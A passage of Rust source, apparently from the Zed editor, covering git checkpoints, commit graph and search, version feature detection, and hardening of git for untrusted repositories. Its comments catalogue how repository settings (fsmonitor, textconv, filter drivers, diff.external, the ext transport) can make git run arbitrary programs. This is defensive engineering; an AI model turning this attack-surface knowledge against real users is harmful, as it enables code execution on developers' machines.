                    restore_worktree_without_git_restore(&mut git, &commit_sha).await?;
                }

                // TODO: We don't track binary and large files anymore,
                //       so the following call would delete them.
                //       Implement an alternative way to track files added by agent.
                //
                // git.with_temp_index(async move |git| {
                //     git.run(&["read-tree", &checkpoint.commit_sha.to_string()])
                //         .await?;
                //     git.run(&["clean", "-d", "--force"]).await
                // })
                // .await?;

                Ok(())
            })
            .boxed()
    }

    fn create_archive_checkpoint(&self) -> BoxFuture<'_, Result<(String, String)>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let mut git = git?.envs(checkpoint_author_envs());
                let head_sha = git
                    .run(&["rev-parse", "HEAD"])
                    .await
                    .context("failed to read HEAD")?;

                // Capture the staged state: write-tree reads the current index
                let staged_tree = git
                    .run(&["write-tree"])
                    .await
                    .context("failed to write staged tree")?;
                let staged_sha = git
                    .run(&[
                        "commit-tree",
                        &staged_tree,
                        "-p",
                        &head_sha,
                        "-m",
                        "WIP staged",
                    ])
                    .await
                    .context("failed to create staged commit")?;

                // Capture the full state (staged + unstaged + untracked) using
                // a temporary index so we don't disturb the real one.
                let unstaged_sha = git
                    .with_temp_index(async |git| {
                        git.run(&["add", "--all"]).await?;
                        let full_tree = git.run(&["write-tree"]).await?;
                        let sha = git
                            .run(&[
                                "commit-tree",
                                &full_tree,
                                "-p",
                                &staged_sha,
                                "-m",
                                "WIP unstaged",
                            ])
                            .await?;
                        Ok(sha)
                    })
                    .await
                    .context("failed to create unstaged commit")?;

                Ok((staged_sha, unstaged_sha))
            })
            .boxed()
    }

    fn restore_archive_checkpoint(
        &self,
        staged_sha: String,
        unstaged_sha: String,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                // First, set the index AND working tree to match the unstaged
                // tree. --reset -u computes a tree-level diff between the
                // current index and unstaged_sha's tree and applies additions,
                // modifications, and deletions to the working directory.
                git.run(&["read-tree", "--reset", "-u", &unstaged_sha])
                    .await
                    .context("failed to restore working directory from unstaged commit")?;

                // Then replace just the index with the staged tree. Without -u
                // this doesn't touch the working directory, so the result is:
                // working tree = unstaged state, index = staged state.
                git.run(&["read-tree", &staged_sha])
                    .await
                    .context("failed to restore index from staged commit")?;

                Ok(())
            })
            .boxed()
    }

    fn compare_checkpoints(
        &self,
        left: GitRepositoryCheckpoint,
        right: GitRepositoryCheckpoint,
    ) -> BoxFuture<'_, Result<bool>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                let result = git
                    .run(&[
                        "diff-tree",
                        "--quiet",
                        &left.commit_sha.to_string(),
                        &right.commit_sha.to_string(),
                    ])
                    .await;
                match result {
                    Ok(_) => Ok(true),
                    Err(error) => {
                        if let Some(GitBinaryCommandError { status, .. }) =
                            error.downcast_ref::<GitBinaryCommandError>()
                            && status.code() == Some(1)
                        {
                            return Ok(false);
                        }

                        Err(error)
                    }
                }
            })
            .boxed()
    }

    fn diff_checkpoints(
        &self,
        base_checkpoint: GitRepositoryCheckpoint,
        target_checkpoint: GitRepositoryCheckpoint,
    ) -> BoxFuture<'_, Result<String>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                let git = git?;
                git.run(&[
                    "diff",
                    "--find-renames",
                    "--patch",
                    &base_checkpoint.commit_sha.to_string(),
                    &target_checkpoint.commit_sha.to_string(),
                ])
                .await
            })
            .boxed()
    }

    fn default_branch(
        &self,
        include_remote_name: bool,
    ) -> BoxFuture<'_, Result<Option<SharedString>>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let output = git
                    .run(&[
                        "for-each-ref",
                        "--format=%(refname)\t%(symref)",
                        "refs/remotes/upstream/HEAD",
                        "refs/remotes/origin/HEAD",
                        "refs/heads/",
                    ])
                    .await
                    .unwrap_or_default();
                let refs: HashMap<&str, &str> = output
                    .lines()
                    .filter_map(|line| line.split_once('\t'))
                    .collect();

                if let Some(target) = refs.get("refs/remotes/upstream/HEAD") {
                    let strip_prefix = if include_remote_name {
                        "refs/remotes/"
                    } else {
                        "refs/remotes/upstream/"
                    };
                    if let Some(branch) = target.strip_prefix(strip_prefix) {
                        return Ok(Some(branch.into()));
                    }
                }

                if let Some(target) = refs.get("refs/remotes/origin/HEAD") {
                    let strip_prefix = if include_remote_name {
                        "refs/remotes/"
                    } else {
                        "refs/remotes/origin/"
                    };
                    if let Some(branch) = target.strip_prefix(strip_prefix) {
                        return Ok(Some(branch.into()));
                    }
                }

                let local_branch_exists =
                    |branch: &str| refs.contains_key(format!("refs/heads/{branch}").as_str());

                if let Ok(default_branch) = git.run(&["config", "init.defaultBranch"]).await {
                    if local_branch_exists(&default_branch) {
                        return Ok(Some(default_branch.into()));
                    }
                }

                if local_branch_exists("main") {
                    return Ok(Some("main".into()));
                }

                if local_branch_exists("master") {
                    return Ok(Some("master".into()));
                }

                Ok(None)
            })
            .boxed()
    }

    fn run_hook(
        &self,
        hook: RunHook,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary_in_worktree();
        let git_dir = self.git_dir.clone();
        let help_output = self.any_git_binary_help_output();

        // Note: Do not spawn these commands on the background thread, as this causes some git hooks to hang.
        async move {
            let git_binary = git_binary?;
            let working_directory = git_binary.working_directory.clone();
            if !help_output
                .await
                .lines()
                .any(|line| line.trim().starts_with("hook "))
            {
                let hook_abs_path = git_dir.join("hooks").join(hook.as_str());
                if hook_abs_path.is_file() && git_binary.is_trusted {
                    #[allow(clippy::disallowed_methods)]
                    let output = new_command(&hook_abs_path)
                        .envs(env.iter())
                        .current_dir(&working_directory)
                        .output()
                        .await?;

                    if !output.status.success() {
                        return Err(GitBinaryCommandError {
                            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
                            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
                            status: output.status,
                        }
                        .into());
                    }
                }

                return Ok(());
            }

            if git_binary.is_trusted {
                let git_binary = git_binary.envs(HashMap::clone(&env));
                git_binary
                    .run(&["hook", "run", "--ignore-missing", hook.as_str()])
                    .await?;
            }
            Ok(())
        }
        .boxed()
    }

    fn initial_graph_data(
        &self,
        log_source: LogSource,
        log_order: LogOrder,
        request_tx: Sender<Vec<Arc<InitialGraphCommitData>>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary();

        async move {
            let version = git.version().await;
            let ref_names_are_wrapped = !GitFeature::EmptyLogFormat.is_supported_by(version);
            let format = if ref_names_are_wrapped {
                LEGACY_GRAPH_COMMIT_FORMAT
            } else {
                GRAPH_COMMIT_FORMAT
            };
            let log_source_args = log_source.get_args();
            let mut git_log_command = vec!["log", format, log_order_argument(log_order, version)];
            git_log_command.extend(log_source_args.iter().map(|arg| arg.as_ref()));
            let mut command = git.build_command(&git_log_command).await;
            command.stdout(Stdio::piped());
            command.stderr(Stdio::piped());

            let mut child = command.spawn()?;
            let stdout = child.stdout.take().context("failed to get stdout")?;
            let stderr = child.stderr.take().context("failed to get stderr")?;
            let mut reader = BufReader::new(stdout);

            let mut line_buffer = String::new();
            let mut lines: Vec<String> = Vec::with_capacity(GRAPH_CHUNK_SIZE);

            loop {
                line_buffer.clear();
                let bytes_read = reader.read_line(&mut line_buffer).await?;

                if bytes_read == 0 {
                    if !lines.is_empty() {
                        let commits = parse_initial_graph_output(
                            lines.iter().map(|s| s.as_str()),
                            ref_names_are_wrapped,
                        );
                        if request_tx.send(commits).await.is_err() {
                            log::warn!(
                                "initial_graph_data: receiver dropped while sending commits"
                            );
                        }
                    }
                    break;
                }

                let line = line_buffer.trim_end_matches('\n').to_string();
                lines.push(line);

                if lines.len() >= GRAPH_CHUNK_SIZE {
                    let commits = parse_initial_graph_output(
                        lines.iter().map(|s| s.as_str()),
                        ref_names_are_wrapped,
                    );
                    if request_tx.send(commits).await.is_err() {
                        log::warn!("initial_graph_data: receiver dropped while streaming commits");
                        break;
                    }
                    lines.clear();
                }
            }

            let status = child.status().await?;
            if !status.success() {
                let mut stderr_output = String::new();
                BufReader::new(stderr)
                    .read_to_string(&mut stderr_output)
                    .await
                    .log_err();

                if stderr_output.is_empty() {
                    anyhow::bail!("git log command failed with {}", status);
                } else {
                    anyhow::bail!("git log command failed with {}: {}", status, stderr_output);
                }
            }
            Ok(())
        }
        .boxed()
    }

    fn search_commits(
        &self,
        log_source: LogSource,
        search_args: SearchCommitArgs,
        request_tx: Sender<Oid>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary();

        async move {
            search_args.validate()?;
            if search_args
                .commits
                .as_ref()
                .is_some_and(|commits| commits.is_empty())
            {
                return Ok(());
            }
            let revisions = match search_args.branch.as_deref() {
                Some(branch) => {
                    anyhow::ensure!(
                        matches!(log_source, LogSource::All),
                        i18n::t!(
                            "\"{prefix}:\" can only be used while the graph shows all branches.",
                            prefix =
                                commit_search::CommitSearchConditionKind::Branch.query_prefix()
                        )
                    );
                    let default_branch = self.default_branch(true).await?;
                    let mut patterns = vec![
                        "for-each-ref".to_string(),
                        "--format=%(refname)".to_string(),
                        branch.to_string(),
                    ];
                    if let Some(default_branch) = default_branch.as_deref() {
                        patterns.push(format!("refs/heads/{default_branch}"));
                        patterns.push(format!("refs/remotes/{default_branch}"));
                    }
                    let existing_refs = git
                        .run(&patterns)
                        .await?
                        .lines()
                        .map(str::to_string)
                        .collect::<HashSet<_>>();
                    branch_search_revisions(branch, default_branch.as_deref(), &existing_refs)?
                }
                None => log_source
                    .get_args()
                    .into_iter()
                    .map(|arg| arg.into_owned())
                    .collect(),
            };
            let version = git.version().await;
            let Some(search_log_args) = commit_search_log_args(&search_args, revisions, version)?
            else {
                return Ok(());
            };

            let hash_prefix = search_hash_prefix(&search_args);
            let fold_case = |text: &str| {
                if search_args.case_sensitive {
                    text.to_string()
                } else {
                    text.to_lowercase()
                }
            };
            // git ors several `--author`s, so the second one on is checked here.
            let authors_to_and = if search_args.authors.len() > 1 {
                search_args
                    .author_filters()?
                    .into_iter()
                    .map(fold_case)
                    .collect::<Vec<_>>()
            } else {
                Vec::new()
            };
            let commit_set = search_args
                .commits
                .as_ref()
                .map(|commits| commits.iter().copied().collect::<HashSet<_>>());

            let mut args = vec!["log".to_string(), SEARCH_COMMIT_FORMAT.to_string()];
            args.extend(search_log_args);
            let mut command = git.build_command(&args).await;
            command.stdout(Stdio::piped());
            command.stderr(Stdio::piped());
            // A search for changed text reads every diff in the history; one given up on (the
            // box cleared, the graph closed) must not keep git busy until the end.
            command.kill_on_drop(true);

            let mut child = command.spawn()?;
            let stdout = child.stdout.take().context("failed to get stdout")?;
            let stderr = child.stderr.take().context("failed to get stderr")?;
            // Read alongside stdout: a pipe nobody drains stalls git once it fills.
            let stderr_task = self.executor.spawn(async move {
                let mut stderr_output = Vec::new();
                BufReader::new(stderr)
                    .read_to_end(&mut stderr_output)
                    .await
                    .log_err();
                String::from_utf8_lossy(&stderr_output).into_owned()
            });
            let mut reader = BufReader::new(stdout);

            let mut line_buffer = Vec::new();

            loop {
                line_buffer.clear();
                let bytes_read = reader.read_until(b'\n', &mut line_buffer).await?;

                if bytes_read == 0 {
                    break;
                }

                // Author names in older histories are not always UTF-8, and one such commit must
                // not fail the whole search.
                let line = String::from_utf8_lossy(&line_buffer);
                let line = line.trim_end_matches(['\n', '\r']);
                let (sha, author) = line.split_once('\0').unwrap_or((line, ""));
                if let Some(hash_prefix) = hash_prefix.as_ref()
                    && !sha.to_ascii_lowercase().starts_with(hash_prefix)
                {
                    continue;
                }
                if !authors_to_and.is_empty() {
                    let author = fold_case(author);
                    if !authors_to_and
                        .iter()
                        .all(|wanted| author.contains(wanted.as_str()))
                    {
                        continue;
                    }
                }

                let Ok(oid) = Oid::from_str(sha) else {
                    continue;
                };
                if commit_set
                    .as_ref()
                    .is_some_and(|commit_set| !commit_set.contains(&oid))
                {
                    continue;
                }
                if request_tx.send(oid).await.is_err() {
                    // Nobody is listening any more; dropping the child stops git.
                    return Ok(());
                }
            }

            let status = child.status().await?;
            if !status.success() {
                let stderr_output = stderr_task.await;
                bail!(i18n::t!(
                    "Could not search the commits: {error}",
                    error = stderr_output.trim()
                ));
            }
            Ok(())
        }
        .boxed()
    }

    fn file_history_changed_files(
        &self,
        paths: Vec<RepoPath>,
        commit_limit: usize,
    ) -> BoxFuture<'_, Result<Vec<FileHistoryChangedFileSets>>> {
        let git = self.git_binary();
        let shallow_file_path = self.common_dir.join("shallow");

        async move {
            if paths.is_empty() {
                return Ok(Vec::new());
            }

            if commit_limit == 0 {
                return Ok(vec![FileHistoryChangedFileSets::default(); paths.len()]);
            }

            let max_count_arg = format!("--max-count={commit_limit}");
            let mut args = [
                "log",
                max_count_arg.as_str(),
                "--full-diff",
                "--no-renames",
                "--name-only",
                "-z",
                "--format=%x1e%H",
                "--",
            ]
            .map(OsString::from)
            .to_vec();
            args.extend(paths.iter().map(|path| OsString::from(path.as_unix_str())));

            let output = git.build_command(&args).await.output().await?;
            anyhow::ensure!(
                output.status.success(),
                "git log failed:\n{}",
                String::from_utf8_lossy(&output.stderr)
            );

            let shallow_boundary_oids = read_shallow_file(&shallow_file_path)
                .await?
                .map(|contents| {
                    contents
                        .lines()
                        .map(|line| line.trim().to_string())
                        .collect::<HashSet<_>>()
                })
                .unwrap_or_default();

            let stdout = String::from_utf8_lossy(&output.stdout);
            Ok(parse_file_history_changed_files_output(
                &stdout,
                &paths,
                &shallow_boundary_oids,
            ))
        }
        .boxed()
    }

    fn commit_data_reader(&self) -> Result<CommitDataReader> {
        let git_binary = self.git_binary();

        let (request_tx, request_rx) = async_channel::bounded::<CommitDataRequest>(64);

        let task = self.executor.spawn(async move {
            if let Err(error) = run_commit_data_reader(git_binary, request_rx).await {
                log::error!("commit data reader failed: {error:?}");
            }
        });

        Ok(CommitDataReader {
            request_tx,
            _task: task,
        })
    }

    fn set_trusted(&self, trusted: bool) {
        self.is_trusted
            .store(trusted, std::sync::atomic::Ordering::Release);
    }

    fn is_trusted(&self) -> bool {
        self.is_trusted.load(std::sync::atomic::Ordering::Acquire)
    }

    fn set_identity(&self, identity: Option<Arc<GitIdentity>>) {
        *self.identity.lock() = identity;
    }

    fn identity(&self) -> Option<Arc<GitIdentity>> {
        self.identity.lock().clone()
    }
}

async fn run_commit_data_reader(
    git: GitBinary,
    request_rx: async_channel::Receiver<CommitDataRequest>,
) -> Result<()> {
    let mut process = git
        .build_command(&["cat-file", "--batch"])
        .await
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("starting git cat-file --batch process")?;

    let mut stdin = BufWriter::new(process.stdin.take().context("no stdin")?);
    let mut stdout = BufReader::new(process.stdout.take().context("no stdout")?);

    const MAX_BATCH_SIZE: usize = 64;

    while let Ok(first_request) = request_rx.recv().await {
        let mut pending_requests = vec![first_request];

        while pending_requests.len() < MAX_BATCH_SIZE {
            match request_rx.try_recv() {
                Ok(request) => pending_requests.push(request),
                Err(_) => break,
            }
        }

        for request in &pending_requests {
            stdin.write_all(request.sha.to_string().as_bytes()).await?;
            stdin.write_all(b"\n").await?;
        }
        stdin.flush().await?;

        for request in pending_requests {
            let result = read_single_commit_response(&mut stdout, &request.sha).await;
            request.response_tx.send(result).ok();
        }
    }

    drop(stdin);
    process.kill().ok();

    Ok(())
}

async fn read_single_commit_response<R: smol::io::AsyncBufRead + Unpin>(
    stdout: &mut R,
    sha: &Oid,
) -> Result<CommitData> {
    let mut header_bytes = Vec::new();
    stdout.read_until(b'\n', &mut header_bytes).await?;
    let header_line = String::from_utf8_lossy(&header_bytes);

    let parts: Vec<&str> = header_line.trim().split(' ').collect();
    if parts.len() < 3 {
        bail!("invalid cat-file header: {header_line}");
    }

    let object_type = parts[1];
    if object_type == "missing" {
        bail!("object not found: {}", sha);
    }

    if object_type != "commit" {
        bail!("expected commit object, got {object_type}");
    }

    let size: usize = parts[2]
        .parse()
        .with_context(|| format!("invalid object size: {}", parts[2]))?;

    let mut content = vec![0u8; size];
    stdout.read_exact(&mut content).await?;

    let mut newline = [0u8; 1];
    stdout.read_exact(&mut newline).await?;

    let content_str = String::from_utf8_lossy(&content);
    parse_cat_file_commit(*sha, &content_str)
        .ok_or_else(|| anyhow!("failed to parse commit {}", sha))
}

fn parse_file_history_changed_files_output(
    output: &str,
    queried_paths: &[RepoPath],
    shallow_boundary_oids: &HashSet<String>,
) -> Vec<FileHistoryChangedFileSets> {
    let mut histories = vec![FileHistoryChangedFileSets::default(); queried_paths.len()];

    for record in output.split('\x1e') {
        let mut fields = record.split('\0');
        let sha = fields.next().unwrap_or_default().trim();
        if shallow_boundary_oids.contains(sha) {
            continue;
        }
        let changed_files = fields
            .filter_map(|field| {
                let path = field.trim_start_matches('\n');
                if path.is_empty() {
                    return None;
                }
                RepoPath::new(path).ok()
            })
            .collect::<std::collections::BTreeSet<_>>();

        if changed_files.is_empty() {
            continue;
        }

        let file_set = changed_files.iter().cloned().collect::<Vec<_>>();
        for (index, queried_path) in queried_paths.iter().enumerate() {
            if changed_files.contains(queried_path) {
                histories[index].file_sets.push(file_set.clone());
            }
        }
    }

    histories
}

/// `ref_names_are_wrapped` is for [`LEGACY_GRAPH_COMMIT_FORMAT`]'s ` (HEAD, main)`.
fn parse_initial_graph_output<'a>(
    lines: impl Iterator<Item = &'a str>,
    ref_names_are_wrapped: bool,
) -> Vec<Arc<InitialGraphCommitData>> {
    lines
        .filter(|line| !line.is_empty())
        .filter_map(|line| {
            // Format: "SHA\x00PARENT1 PARENT2...\x00REF1, REF2, ..."
            let mut parts = line.split('\x00');

            let sha = Oid::from_str(parts.next()?).ok()?;
            let parents_str = parts.next()?;
            let parents = parents_str
                .split_whitespace()
                .filter_map(|p| Oid::from_str(p).ok())
                .collect();

            let ref_names_str = parts.next().unwrap_or("");
            let ref_names_str = if ref_names_are_wrapped {
                ref_names_str
                    .trim()
                    .strip_prefix('(')
                    .and_then(|ref_names| ref_names.strip_suffix(')'))
                    .unwrap_or("")
            } else {
                ref_names_str
            };
            let ref_names = if ref_names_str.is_empty() {
                Vec::new()
            } else {
                ref_names_str
                    .split(", ")
                    .filter(|decoration| *decoration != "grafted" && *decoration != "replaced")
                    .map(|s| SharedString::from(s.to_string()))
                    .collect()
            };

            Some(Arc::new(InitialGraphCommitData {
                sha,
                parents,
                ref_names,
            }))
        })
        .collect()
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct GitVersion {
    major: u32,
    minor: u32,
    patch: u32,
}

impl GitVersion {
    const fn new(major: u32, minor: u32, patch: u32) -> Self {
        Self {
            major,
            minor,
            patch,
        }
    }

    /// Parses `git --version` output such as `git version 2.45.1.windows.1`
    /// or `git version 2.39.3 (Apple Git-146)`.
    fn parse(version_output: &str) -> Option<Self> {
        let version = version_output
            .lines()
            .find_map(|line| line.trim().strip_prefix("git version "))?
            .split_whitespace()
            .next()?;
        let mut components = version.split('.');
        let major = components.next()?.parse().ok()?;
        let minor = components.next()?.parse().ok()?;
        // Builds from git's own source tree report versions like `2.45.GIT`.
        let patch = components
            .next()
            .and_then(|patch| patch.parse().ok())
            .unwrap_or(0);
        Some(Self {
            major,
            minor,
            patch,
        })
    }
}

impl std::fmt::Display for GitVersion {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(formatter, "{}.{}.{}", self.major, self.minor, self.patch)
    }
}

/// Git features that Zed relies on and that older git releases lack, each tied to the release
/// that introduced it (see git's `Documentation/RelNotes`). Git rejects a whole command line over
/// one option it doesn't know, so each of these needs a fallback or a clear error on older git.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum GitFeature {
    /// `git remote remove`; older releases only know `git remote rm`.
    RemoteRemove,
    /// `git branch --set-upstream-to`; older releases only know `--set-upstream`.
    SetUpstreamTo,
    /// `git show --no-patch`; older releases only know `-s`.
    ShowNoPatch,
    /// `git cat-file --batch=<format>` and `--batch-check=<format>`.
    CatFileBatchFormat,
    /// `git log --author-date-order`.
    AuthorDateOrder,
    /// `git push --force-with-lease`.
    ForceWithLease,
    /// The `%(HEAD)` and `%(upstream:track)` atoms of `git for-each-ref`, and `**` in its ref
    /// patterns matching any number of directories.
    BranchListAtoms,
    /// An empty `--format=` printing no commit header rather than the default format, and the
    /// `%D` placeholder.
    EmptyLogFormat,
    /// `git -c <name>=` giving an empty value; older git takes it for a missing one, which fails
    /// every command that reads the setting.
    EmptyConfigValue,
    /// `git --no-pager worktree`, which segfaults on git 2.7.4.
    NoPagerWorktree,
    /// `git stash push --include-untracked` with a pathspec naming untracked files. Before git
    /// 2.18 those files are cleaned away first, after which the tracked changes are silently left
    /// in place.
    StashPushWithUntrackedPaths,
    /// `git status --porcelain=<version>`; before it plain `--porcelain` is version 1.
    PorcelainVersion,
    /// `git clean -d`, which `git stash save --include-untracked` runs, leaving the ignored files
    /// inside untracked directories alone. Before git 2.14 it deletes them, and the stash doesn't
    /// have them either.
    CleanKeepsIgnoredFiles,
    /// `git worktree add`.
    WorktreeAdd,
    /// `git worktree list`.
    WorktreeList,
    /// `git for-each-ref --contains`.
    ForEachRefContains,
    /// The `core.hooksPath` setting, with which `build_command` disables an untrusted
    /// repository's hooks.
    HooksPath,
    /// The `unix` date format.
    UnixDateFormat,
    /// The `protocol.<name>.allow` settings, with which `build_command` forbids the `ext`
    /// transport in an untrusted repository.
    ProtocolAllow,
    /// `%(upstream:track)` reporting `[gone]` for an upstream that no longer exists.
    UpstreamGone,
    /// `git stash push`, the only form of `git stash` that takes a pathspec.
    StashPush,
    /// `git --no-optional-locks`.
    NoOptionalLocks,
    /// `git worktree remove` and `git worktree move`.
    WorktreeRemove,
    /// `git status --no-renames`.
    StatusNoRenames,
    /// `git switch` and `git restore`.
    SwitchAndRestore,
    /// `git worktree repair`.
    WorktreeRepair,
    /// `git diff --merge-base` and `git diff-tree --merge-base`.
    DiffMergeBase,
    /// `git stash push --staged`.
    StashStaged,
    /// `git rebase --autostash`.
    RebaseAutostash,
    /// `git cherry-pick --skip` and `git revert --skip`.
    SequencerSkip,
    /// The `REBASE_HEAD` ref, which is what a stopped rebase is recognized by. Older releases
    /// leave nothing behind that says a rebase rather than something else stopped.
    RebaseHeadRef,
    /// `git log -G`.
    PickaxeRegex,
    /// The `:(literal)` and `:(glob)` pathspec magic.
    PathspecMagic,
    /// `git config --show-scope`.
    ConfigShowScope,
}

impl GitFeature {
    const fn minimum_version(self) -> GitVersion {
        match self {
            Self::PickaxeRegex => GitVersion::new(1, 7, 4),
            Self::RemoteRemove => GitVersion::new(1, 7, 12),
            Self::SetUpstreamTo => GitVersion::new(1, 8, 0),
            Self::ShowNoPatch | Self::CatFileBatchFormat | Self::AuthorDateOrder => {
                GitVersion::new(1, 8, 4)
            }
            Self::ForceWithLease => GitVersion::new(1, 8, 5),
            Self::BranchListAtoms | Self::PathspecMagic => GitVersion::new(1, 9, 0),
            Self::EmptyLogFormat => GitVersion::new(2, 2, 0),
            // Fixed by 2.2.0 and backported to 2.1.1.
            Self::EmptyConfigValue => GitVersion::new(2, 1, 1),
            // The oldest release seen working; 2.7.4 is the newest seen crashing.
            Self::NoPagerWorktree => GitVersion::new(2, 11, 0),
            Self::WorktreeAdd => GitVersion::new(2, 5, 0),
            Self::RebaseAutostash => GitVersion::new(2, 6, 0),
            Self::PorcelainVersion => GitVersion::new(2, 11, 0),
            // Fixed by 2.14.0 and backported to 2.13.2.
            Self::CleanKeepsIgnoredFiles => GitVersion::new(2, 14, 0),
            Self::WorktreeList | Self::ForEachRefContains => GitVersion::new(2, 7, 0),
            Self::HooksPath => GitVersion::new(2, 9, 0),
            // Introduced by 2.10.0 and backported to 2.9.4.
            Self::UnixDateFormat => GitVersion::new(2, 9, 4),
            Self::ProtocolAllow => GitVersion::new(2, 12, 0),
            Self::UpstreamGone | Self::StashPush | Self::RebaseHeadRef => GitVersion::new(2, 13, 0),
            Self::SequencerSkip => GitVersion::new(2, 22, 0),
            Self::NoOptionalLocks => GitVersion::new(2, 15, 0),
            Self::WorktreeRemove => GitVersion::new(2, 17, 0),
            Self::StatusNoRenames | Self::StashPushWithUntrackedPaths => GitVersion::new(2, 18, 0),
            Self::SwitchAndRestore => GitVersion::new(2, 23, 0),
            Self::WorktreeRepair => GitVersion::new(2, 29, 0),
            Self::ConfigShowScope => GitVersion::new(2, 26, 0),
            Self::DiffMergeBase => GitVersion::new(2, 30, 0),
            Self::StashStaged => GitVersion::new(2, 35, 0),
        }
    }

    /// An unknown version counts as supporting everything, so that an unrecognized version
    /// string can't change how a modern git is driven.
    fn is_supported_by(self, version: Option<GitVersion>) -> bool {
        version.is_none_or(|version| version >= self.minimum_version())
    }

    /// Fails with an explanation when `version` is known to predate this feature.
    fn require(self, version: Option<GitVersion>, what: &str) -> Result<()> {
        match version {
            Some(version) if !self.is_supported_by(Some(version)) => bail!(i18n::t!(
                "\"{what}\" needs git {minimum} or later (this git is {version}).",
                minimum = self.minimum_version()
            )),
            _ => Ok(()),
        }
    }
}

#[derive(Default)]
struct GitVersionProbe {
    /// Set once probed; `Some(None)` is a version string that wasn't recognized.
    version: Option<Option<GitVersion>>,
    /// When the probe last failed to run.
    last_failure: Option<Instant>,
}

/// Every git command waits for the probe, so a git that fails to run is probed again only after
/// this long rather than before each command.
const GIT_VERSION_PROBE_RETRY_INTERVAL: Duration = Duration::from_secs(60);

/// Keyed by binary path so that every repository using the same git shares one probe.
static GIT_BINARY_VERSIONS: LazyLock<
    Mutex<HashMap<PathBuf, Arc<smol::lock::Mutex<GitVersionProbe>>>>,
> = LazyLock::new(|| Mutex::new(HashMap::default()));

/// Options that precede the subcommand of every git command Zed runs.
fn git_global_args(version: Option<GitVersion>, is_trusted: bool) -> Vec<&'static str> {
    // Disabled to stop malicious actors from running arbitrary commands via fsmonitor hooks
    let mut args = vec!["-c", "core.fsmonitor=false"];
    // Prepended signature lines would corrupt our --format parsers.
    args.extend(["-c", "log.showSignature=false"]);
    if GitFeature::NoOptionalLocks.is_supported_by(version) {
        args.push("--no-optional-locks");
    }
    // Internal commands must be non-interactive so background tasks never block on user input.
    args.push("--no-pager");
    if !is_trusted {
        // Without empty `-c` values these two overrides would fail every command reading the
        // setting. Such a git is refused remote operations in untrusted repositories anyway,
        // and `build_command` gives `git diff` `--no-ext-diff` (see
        // `untrusted_subcommand_guards`).
        let has_empty_config_values = GitFeature::EmptyConfigValue.is_supported_by(version);
        args.extend([
            "-c",
            "core.hooksPath=/dev/null",
            "-c",
            "core.sshCommand=ssh",
        ]);
        if has_empty_config_values {
            args.extend(["-c", "credential.helper="]);
        }
        args.extend(["-c", "protocol.ext.allow=never"]);
        // The signature checks run the program the `gpg.*` settings name.
        args.extend(["-c", "merge.verifySignatures=false"]);
        // `diff.submodule=diff` runs `git diff` inside a submodule, which is not told
        // `--no-textconv` and so runs the submodule's own textconv programs.
        args.extend(["-c", "diff.submodule=short"]);
        if has_empty_config_values {
            args.extend(["-c", "diff.external="]);
        }
    }
    args
}

/// Options that follow the subcommand of every command run in an untrusted repository.
///
/// The repository's own configuration can name a program for `diff`, `log`, `show` and `blame` to
/// run on file contents: `diff.external` and a `diff.<driver>.command` picked by
/// `.gitattributes` (off with `--no-ext-diff`), and `diff.<driver>.textconv` (off with
/// `--no-textconv`). `git_global_args` also empties `diff.external`, which a recent git (2.47)
/// reads as a program named "", failing every patch with `cannot spawn :` unless `--no-ext-diff`
/// is given.
///
/// `status` and a working-tree `diff` also ask each submodule whether its files changed, which
/// runs git there under the submodule's own configuration, and `submodule.<name>.ignore` can ask
/// for the check whatever `diff.ignoreSubmodules` says. `--ignore-submodules=dirty` still reports
/// a submodule at another commit, without looking inside it, which spares these frequent commands
/// finding every submodule's filter drivers (see `command_may_look_inside_submodules`).
fn untrusted_subcommand_guards(subcommand: &OsStr) -> &'static [&'static str] {
    match subcommand.to_str() {
        Some("diff") => &[
            "--no-ext-diff",
            "--no-textconv",
            "--ignore-submodules=dirty",
        ],
        Some("log" | "show") => &["--no-ext-diff", "--no-textconv"],
        Some("blame") => &["--no-textconv"],
        Some("status") => &["--ignore-submodules=dirty"],
        _ => &[],
    }
}

/// Whether a command can convert file contents between the working tree and the object
/// database, which runs the `filter.<driver>.clean`, `smudge` or `process` program that
/// `.gitattributes` picks. Only the subcommands known never to do so are listed, so that a new
/// caller is protected by default.
///
/// `ls-files` and `describe` are not among them: `ls-files -m` and `describe --dirty` hash a
/// file whose timestamps changed to tell whether its contents did, which runs `clean`, and both
/// are reachable with any flags through `run_command`. `cat-file` converts only with
/// `--filters` or `--textconv` (or an abbreviation of either), so it counts as safe only with the
/// flags this fork gives it.
fn command_may_run_filters<S: AsRef<OsStr>>(args: &[S]) -> bool {
    let Some((subcommand, rest)) = args.split_first() else {
        return false;
    };
    if subcommand.as_ref() == "cat-file" {
        return !rest
            .iter()
            .all(|argument| match argument.as_ref().to_str() {
                Some(argument) => {
                    !argument.starts_with('-')
                        || argument.starts_with("--batch")
                        || matches!(argument, "-e" | "-p" | "-s" | "-t" | "--buffer")
                }
                None => false,
            });
    }
    !matches!(
        subcommand.as_ref().to_str(),
        Some(
            "branch"
                | "check-attr"
                | "check-ignore"
                | "commit-tree"
                | "config"
                | "count-objects"
                | "diff-tree"
                | "fetch"
                | "for-each-ref"
                | "log"
                | "ls-remote"
                | "ls-tree"
                | "merge-base"
                | "name-rev"
                | "pack-refs"
                | "push"
                | "reflog"
                | "remote"
                | "rev-list"
                | "rev-parse"
                | "show"
                | "show-ref"
                | "symbolic-ref"
                | "tag"
                | "update-ref"
                | "var"
                | "version"
                | "--version"
                | "write-tree"
        )
    )
}

/// Whether a command can verify or make a signature, which runs the program the `gpg.*` settings
